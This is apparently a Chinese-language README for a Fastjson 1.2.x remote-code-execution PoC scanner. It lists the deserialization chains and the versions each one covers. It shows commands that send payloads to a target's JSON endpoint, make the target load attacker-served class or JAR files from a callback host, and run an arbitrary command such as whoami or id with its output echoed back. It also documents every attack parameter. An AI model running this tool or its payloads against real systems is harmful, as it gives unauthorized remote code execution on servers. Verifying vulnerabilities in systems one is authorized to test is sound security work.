# Fastjson 全版本 RCE PoC（2026）

2026 版 Fastjson 1.2.x 全版本 RCE 验证工具。默认扫描全部 151 条“链路 × 版本”用例，并通过命令回显确认 RCE。

## 覆盖范围

| 链路 | 覆盖版本 | 资源类型 |
| --- | --- | --- |
| `direct` | `1.2.0-1.2.24` | HTTP class |
| `cache` | `1.2.9-1.2.48` | HTTP class，两阶段请求 |
| `autocloseable` | `1.2.24-1.2.62`、`1.2.66-1.2.69` | HTTP class |
| `jsontype-http` | `1.2.36-1.2.47` | 带 `@JSONType` 的 HTTP class |
| `jsontype-jar` | `1.2.48-1.2.62`、`1.2.66-1.2.80`、`1.2.83` | 带 `@JSONType` 的 HTTP JAR |

## 使用和命令回显

需要 Python 3、`java`、`javac`。以下命令使用本机目标 `127.0.0.1`：

```bash
python3 poc/scan_target.py --target 'http://127.0.0.1:8080/parse'
```

默认回连服务为 `127.0.0.1:18080`，默认执行 `whoami`。成功时终端会显示命令输出，同时写入 `scan-output/<时间>-<ID>/results.jsonl`。

```bash
# 改为执行 id
python3 poc/scan_target.py \
  --target 'http://127.0.0.1:8080/parse' \
  --command id

# 只测试指定链路和版本
python3 poc/scan_target.py \
  --target 'http://127.0.0.1:8080/parse' \
  --chains jsontype-jar,autocloseable \
  --versions 1.2.68,1.2.69,1.2.83
```

`command-output` 表示已获得命令回显并确认 RCE；收到首条回显后默认停止。传入 `--continue-after-command-output` 可继续剩余用例。`callback-observed` 仅表示目标请求了专属资源，`no-callback` 表示没有观察到回连。

## 本地全版本 JAR 包

Release 附件 `fastjson-1.2.x-jars-2026.zip` 包含 79 个标准数字版本 JAR：`1.2.0-1.2.62`、`1.2.66-1.2.80`、`1.2.83`，并附带 `SHA256SUMS` 和 `MANIFEST.json`。下载页：[fastjson-1.2.x-jars-2026](https://github.com/ThanatosXingYu/2026FastjsonPoC/releases/tag/fastjson-1.2.x-jars-2026)。

```bash
curl -L -o fastjson-1.2.x-jars-2026.zip \
  https://github.com/ThanatosXingYu/2026FastjsonPoC/releases/download/fastjson-1.2.x-jars-2026/fastjson-1.2.x-jars-2026.zip
unzip fastjson-1.2.x-jars-2026.zip
python3 poc/scan_target.py \
  --target 'http://127.0.0.1:8080/parse' \
  --jars-dir ./fastjson-1.2.x-jars
```

`--jars-dir` 会校验本次所选版本的 JAR 是否齐全，并把绝对路径、SHA-256 和大小写入 `manifest.json`；默认全量扫描会校验包内全部 79 个版本。

## 内置文件

| 文件 | 大小 | 用途 |
| --- | ---: | --- |
| `lib/asm-9.6.jar` | 121 KB | 生成专属 class/JAR 制品 |

运行过程不下载依赖；`.scan-cache/` 只保存本机编译生成器产生的 class 文件。

## 参数

| 参数 | 默认值 | 说明 |
| --- | --- | --- |
| `--target` | 无 | JSON 接口完整 URL；发送扫描时必填 |
| `--command` | `whoami` | 命中后执行并回传标准输出的命令，例如 `id` |
| `--chains` | `all` | 指定链路，逗号分隔 |
| `--versions` | `all` | 指定 Fastjson 版本，逗号分隔 |
| `--jars-dir` | 无 | 本地 `fastjson-<版本>.jar` 目录；校验所选版本并记录 SHA-256 |
| `--callback-host` | `127.0.0.1` | 回连主机；IPv4 会自动转换为 payload token |
| `--callback-port` | `18080` | 回连 HTTP 服务端口 |
| `--listen-host` | `127.0.0.1` | 本地回连服务绑定地址 |
| `--header` | 无 | 可重复添加请求头，例如 `--header 'X-Key: value'` |
| `--method` | `POST` | 目标请求方法 |
| `--request-timeout` | `8` | 单次目标请求超时秒数 |
| `--callback-wait` | `0.35` | 每条用例等待资源回连秒数 |
| `--command-wait` | `3` | 每条用例等待命令回显秒数 |
| `--continue-after-command-output` | 关闭 | 获得首条命令输出后继续其余用例 |
| `--build-dir` | `.scan-cache/` | 本地生成器编译产物目录 |
| `--output-dir` | `scan-output/<时间>-<ID>/` | 本次制品和结果目录 |
| `--prepare-only` | 关闭 | 仅生成制品和 manifest，不发送请求 |

## 参考项目

- https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC
- https://github.com/dinosn/fastjson-jsontype-rce-lab
